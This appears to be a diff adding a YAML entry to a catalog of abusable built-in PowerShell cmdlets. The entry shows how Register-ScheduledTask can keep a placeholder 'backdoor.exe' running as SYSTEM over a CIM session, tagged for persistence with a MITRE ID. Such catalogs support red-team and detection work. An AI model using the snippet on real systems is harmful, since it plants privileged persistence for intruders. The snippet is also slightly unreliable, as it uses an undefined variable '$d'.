@@ -1,0 +1,28 @@
+---
+Name: Register-ScheduledTask
+Description: Registers a scheduled task definition on a local computer
+Updated: 2023-07-01
+Toolsets:
+  - Builtin
+  - CIMSession
+Commands:
+  - Command: |
+      $a = New-ScheduledTaskAction -Execute "C:\Tmp\backdoor.exe" -Argument '-background'
+      $p = New-ScheduledTaskPrincipal -UserId "NT Authority\SYSTEM"
+      $ss = New-ScheduledTaskSettingsSet -MultipleInstances Parallel -AllowStartIfOnBatteries -Compatibility Win8
+      New-ScheduledTask -CimSession $s -Action $a -Principal $p -Settings $ss
+      $t = Register-ScheduledTask -CimSession $s Backdoor -InputObject $d
+    Description: Create new scheduled task
+    Usecases:
+      - Persistence
+    Function: Execute
+    Comments:
+      - 'Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)'
+      - 'PowerShell Module: `ScheduledTasks`'
+    MitreAttack:
+      - T1047
+Resources:
+Detections:
+Contributors:
+    - Name: Arris Huijgen
+      Handle: bitsadmin
